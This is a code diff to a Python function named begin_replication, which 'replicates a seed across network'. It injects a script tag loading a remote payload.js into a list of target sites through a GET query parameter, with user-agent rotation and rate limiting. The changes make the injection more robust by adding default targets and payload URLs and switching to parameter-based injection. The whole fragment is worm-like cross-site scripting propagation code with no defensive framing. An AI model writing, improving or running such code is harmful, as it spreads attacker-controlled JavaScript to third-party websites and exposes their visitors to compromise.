@@ -30,9 +30,15 @@ def begin_replication(target, config):
     print(f"[♻️] Replicating seed across network from {target}")
     logging.info(f"Replicating seed across network from {target}")
 
-    known_targets = config['targets']
-    payload_url = config['payload_url']
+    config = config or {}
+    known_targets = config.get('targets', [target] if target else [])
+    payload_url = config.get('payload_url', f"{target.rstrip('/')}/payload.js" if target else "http://localhost:8080/payload.js")
     injected_script = f"<script src='{payload_url}'></script>"
+
+    if not known_targets:
+        print("[!] No replication targets specified.")
+        logging.warning("No replication targets specified.")
+        return
 
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -60,10 +66,10 @@ def begin_replication(target, config):
         last_request_time = rate_limit(last_request_time, rate_limit_interval)
 
         try:
-            full_url = f"{t}{injected_script}"
-            print(f"[🧬] Injecting into: {full_url}")
-            logging.info(f"Injecting into: {full_url}")
-            r = session.get(full_url, headers=headers, timeout=10)
+            params = {"payload": injected_script}
+            print(f"[🧬] Injecting into: {t} with payload: {injected_script}")
+            logging.info(f"Injecting into: {t} with payload: {injected_script}")
+            r = session.get(t, params=params, headers=headers, timeout=10)
             print(f"[+] Status {r.status_code} from {t}")
             logging.info(f"Status {r.status_code} from {t}")
         except requests.exceptions.RequestException as e:
